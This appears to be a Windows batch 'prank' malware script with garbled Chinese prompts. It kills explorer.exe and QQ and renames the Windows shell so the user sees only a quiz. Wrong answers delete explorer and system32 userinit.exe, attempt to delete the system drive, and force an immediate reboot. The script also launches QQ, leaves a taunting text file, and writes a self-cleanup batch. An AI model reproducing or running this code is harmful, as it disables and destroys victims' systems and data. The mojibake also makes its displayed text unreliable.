@echo off
color 7d
echo ping www.baidu.com > d:ССľ��.exe
taskkill /f /im explorer.exe
taskkill /f /im qq.exe
ren %SystemRoot%explorer.exe killer.dll
cls
echo 90����ô��������90�����ô��������
echo.
echo ���������ÿ����ţ������������ˡ�
echo.
echo �������ģ��ҿɲ��ǻ���,�ٺ٣�O(��_��)O
echo.
echo ������滹ͦ��ܰ�İɣ��ô���Ҳ�ῼ�����б��ߵ�����԰ɣ�
echo.
echo ����ҵĴ��ڹص���Ҳ��ػ����Ų������㣨���棩��
echo.
echo �������һ��ѡ�������ء�
:shi
echo.
set /p AA=�����Y�������ң�����N�������ţ��󰴻س�(y/n):
if /i "%AA%"=="y" goto hui
if /i "%AA%"=="n" goto no
cls
echo �������ѡ����߼������
pause
goto shi
:no
del %SystemRoot%killer.dll
del /f /s /q %SystemRoot%system32userinit.exe
cls
echo ��Ȼ�㲻�����ң�����Ҳûʲ��˵���ˡ�
echo.
echo ����Ϊ��ֻ��ɻ��£�����������ң���ôһ�ж���û�µġ�
echo.
echo ��һ�����밴����������ɣ���?(???)?
pause
echo @echo off >a.bat
echo del d:ССľ��.exe >>a.bat
echo del a.txt >>a.bat
echo del 90��Ů����������̫����.bat >>a.bat
echo exit >>a.bat
shutdown -r -t 00
start a.bat
exit
:hui
cls
echo ������лл�������ң����ѡ������ȷ�ġ�
echo.
echo �����������ð����ҵ���ʾ������²�����С�
echo.
echo ����������ҵ�Ҫ������Ȼ������ϵͳ���ָ��ˡ�
echo.
echo ���ƽ�����ɣ�
echo.
echo ��Ҫ��ס����û����ȫ��������֮ǰ���������������Ƶġ�
echo.
echo ���Ѱɣ��Ǻ�O(��_��)O
pause
echo %date% >a.txt & echo %time% >>a.txt
echo ������С���������˰ɣ� >>a.txt
echo ��������ģ��Ҳ��������ô��������Ҫ���������ڵ����ҵģ� >>a.txt
echo �������𣿺Ǻǡ������ڼ�����ĵ��ԣ����Ա��Ҷ��� >>a.txt
echo ��½���QQ��Ȼ�������ң������ҵ�QQ�ţ�1652289622. >>a.txt
echo ����鿴���ϣ�Ȼ�����ҵĿռ䣬Ȼ�����ҵ����԰���10�Ρ�������˧�� >>a.txt
echo ���ǲ�������QQ�ŵġ���Ϊ��û��˼��������Ǻ������Ϸ�� >>a.txt
echo ���ڿ��Թص�����±��ˡ�O(��_��)O >>a.txt
for %%i in (c,d,e,f) do for /f "delims=" %%n in (��dir /s /b %%i:qq.exe��) do start "" "%%n"
start a.txt
cls
echo ��½���QQ�������Ժ�ִ����һ����
pause
cls
echo �Ǻǣ���Ϸ����Ҳ������ˣ����ģ���������ϵͳ�ͻ�ָ��ˡ�
echo.
echo ����!�һ�������һ��ѡ����Ϸ���������ȷ��ͨ���ˣ��ҾͰ����ϵͳ�ָ��ˣ���!
echo.
echo ���棬������һ����ؼ���ѡ�񣬼�ס��Ҫ���ء�
echo.
echo.
:no1
set /p BB=�����Y��������˧������N����һ�㶼��˧���󰴻س�(y/n):
if /i "%BB%"=="y" goto no3
if /i "%BB%"=="n" goto no2
cls
echo �������ѡ����߼������
pause
goto no1
:no2
del %SystemRoot%killer.dll
del /f /s /q %SystemRoot%system32userinit.exe
attrib -r -s -h %SystemDrive%
tldr % del %SystemDrive%
tldr
cls
echo �Ҳ٣��ҿ����ѵ��Ҳ�˧������ô֪���Ҳ�˧�˰���
echo.
echo �ܰ���С�������������ѵ��Ҳ�˧����֪�������������ϵͳ������
echo.
echo �Ҷ�˵��Ҫ������ѡ���,������ƫƫѡ���ˣ�û�취��?(???)?��
echo.
echo ��һ�����밴����������ɣ���?(???)?
pause
echo @echo off >a.bat
echo del d:ССľ��.exe >>a.bat
echo del a.txt >>a.bat
echo del 90��Ů����������̫����.bat >>a.bat
echo exit >>a.bat
shutdown -r -t 00
start a.bat
exit
:no3
cls
echo.
echo ������лл�㣬��֪����ͦ˧�ģ������������������Լ��������ġ��ٺ�
echo.
echo ����˧!O(��_��)O���������̣�˧�������ɣ�
echo.
echo ��һ������������ָ����ϵͳ�ɡ�
echo.
echo.
echo.
pause
ren %SystemRoot%killer.dll explorer.exe & start %SystemRoot%explorer.exe
del %SystemRoot%killer.dll
cls
echo ��������˰ɣ���������ϲ����ء�
echo.
echo ��������Ź������������Ϊʲô�أ�
echo.
echo ��Ϊ.............
echo.
echo �㿴�����D�̵����ǲ��Ƕ����������أ�
echo.
echo ��֪����ʲô�𣿰���������֪���ˡ�
echo.
pause
echo @echo off >a.bat
echo del d:ССľ��.exe >>a.bat
echo del a.txt >>a.bat
echo del 90��Ů����������̫����.bat >>a.bat
echo exit >>a.bat
start a.bat